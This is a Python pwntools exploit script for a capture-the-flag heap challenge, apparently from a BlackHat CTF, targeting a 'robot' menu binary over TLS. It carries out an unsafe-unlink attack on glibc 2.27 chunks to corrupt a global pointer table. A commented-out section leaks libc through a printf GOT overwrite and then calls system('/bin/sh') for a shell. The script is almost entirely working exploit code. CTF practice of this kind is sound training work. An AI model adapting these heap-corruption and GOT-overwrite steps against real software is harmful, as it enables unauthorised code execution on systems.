#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host blackhat4-cca3bafe4e0fc0910a848657595c2c83-0.chals.bh.ctf.sa --port 443 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'blackhat4-cca3bafe4e0fc0910a848657595c2c83-0.chals.bh.ctf.sa'
port = int(args.PORT or 443)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True, sni=host)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

io = start()
libc = ELF("./libc-2.27.so")

def new_robot(size):
    io.sendafter(b'> ',b'1')
    io.sendafter(b'size',str(size).encode())

def program_robot(index, payload):
    io.sendafter(b'> ',b'2')
    io.sendafter(b'slot:',str(index).encode())
    io.sendafter(b'robot:',payload)

def destroy_robot(index):
    io.sendafter(b'> ',b'3')
    io.sendafter(b'slot:',str(index).encode())
robots = 0x0000000000404100

new_robot(0x428)
new_robot(0x428)
destroy_robot(0)

p = ''
p += p64(0) + p64(0)
p += p64(robots - 8*3)+ p64(robots - 8*2)
p += p64(0)*0x80 # 1024 0x400
p += p64(0x420)
program_robot(0, p)

destroy_robot(1)

# x/100gx 0x00000000404000
# p = p64(exe.plt['printf']) 
# p += p64(0) + p64(0) 
# p += p64(exe.got['atoi']) + p64(0x00000000004040C0)
# p += p64(exe.got['free']) + p64(0x0000000000404120)

# program_robot(0, p)

# program_robot(0, p64(exe.plt['printf']))

# io.sendafter(b'> ',b'%3$p')
# io.recvuntil(b'0x')
# libc.address = int(io.recv(12),16) - 0x110031
# log.info("libc base: " + hex(libc.address))
# free_hook = libc.sym['__free_hook']
# system = libc.sym['system']
# atoi = libc.sym['atoi']
# io.sendafter(b'> ',b'%2c')
# io.sendafter(b'slot:',b'\x00')
# io.sendafter(b'robot:',p64(atoi))

# program_robot(1, p32(0x500)* 8 + p32(1)*8)
# program_robot(2, p64(system))
# program_robot(3, b'/bin/sh\x00')
# destroy_robot(3)

io.interactive()